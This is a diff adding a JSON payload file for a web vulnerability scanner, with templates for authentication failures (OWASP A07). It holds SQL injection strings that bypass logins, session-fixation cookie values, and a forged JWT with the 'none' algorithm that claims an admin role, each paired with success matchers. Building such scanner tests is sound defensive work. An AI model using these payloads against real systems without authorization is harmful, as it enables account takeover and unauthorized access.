@@ -1,0 +1,133 @@
+[
+  {
+    "id": "owasp-a07-auth-bypass-sqli",
+    "info": {
+      "name": "OWASP A07 - Authentication Bypass via SQL Injection",
+      "severity": "critical",
+      "category": "auth-bypass",
+      "description": "SQL injection to bypass authentication (OWASP A07:2025 - Authentication Failures)",
+      "references": [
+        "https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/"
+      ],
+      "tags": [
+        "owasp-a07",
+        "authentication",
+        "auth-bypass",
+        "sqli"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "admin' OR '1'='1'--",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "' OR 1=1--",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "admin'--",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "') OR ('1'='1",
+        "encoding": "none",
+        "method": "POST"
+      },
+      {
+        "value": "admin' /*",
+        "encoding": "none",
+        "method": "POST"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "welcome",
+          "dashboard",
+          "logged in"
+        ]
+      },
+      {
+        "type": "response_status",
+        "condition": "equals",
+        "patterns": ["302", "200"]
+      }
+    ]
+  },
+  {
+    "id": "owasp-a07-session-fixation",
+    "info": {
+      "name": "OWASP A07 - Session Fixation",
+      "severity": "high",
+      "category": "session",
+      "description": "Tests for session fixation vulnerabilities (OWASP A07:2025)",
+      "references": [
+        "https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/"
+      ],
+      "tags": [
+        "owasp-a07",
+        "authentication",
+        "session-fixation"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "PHPSESSID=attacker_session_id",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "sessionid=fixed_session_123",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_header",
+        "condition": "not_contains",
+        "patterns": [
+          "Set-Cookie"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "owasp-a07-jwt-none-algorithm",
+    "info": {
+      "name": "OWASP A07 - JWT None Algorithm Attack",
+      "severity": "critical",
+      "category": "authentication",
+      "description": "Tests JWT with 'none' algorithm bypass (OWASP A07:2025)",
+      "references": [
+        "https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/"
+      ],
+      "tags": [
+        "owasp-a07",
+        "authentication",
+        "jwt",
+        "token"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_status",
+        "condition": "equals",
+        "patterns": ["200"]
+      }
+    ]
+  }
+]
